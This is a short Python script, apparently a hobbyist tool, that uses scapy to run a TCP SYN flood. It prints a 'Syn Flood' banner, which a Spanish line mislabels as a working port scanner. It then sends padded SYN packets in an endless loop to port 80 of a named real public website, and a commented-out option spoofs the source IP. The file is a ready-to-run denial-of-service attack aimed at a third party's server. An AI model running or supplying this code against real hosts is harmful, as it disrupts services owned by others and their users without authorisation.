from scapy.all import *
from colorama import init, Fore
import sys, random, time

# some colors
init()
GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX

def ClownLogo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
 
           _____                ________                __
          / ___/__  ______     / ____/ /___  ____  ____/ /
          \__ \/ / / / __ \   / /_  / / __ \/ __ \/ __  / 
         ___/ / /_/ / / / /  / __/ / / /_/ / /_/ / /_/ /  
        /____/\__, /_/ /_/  /_/   /_/\____/\____/\__,_/   
             /____/                                       
  Nota! : Scanning Port es un escaner 100% funcional, verifique con nmap.       
    """
    for N, line in enumerate(x.split("\n")):
         sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
         time.sleep(0.05)

ClownLogo()
# target IP address (should be a testing router/firewall)
target_ip = "www.xnxx.com"
# the target port u want to flood
target_port = 80
# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# add some flooding data (1KB in this case, don't increase it too much, 
# otherwise, it won't work.)
raw = Raw(b"X"*1024)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)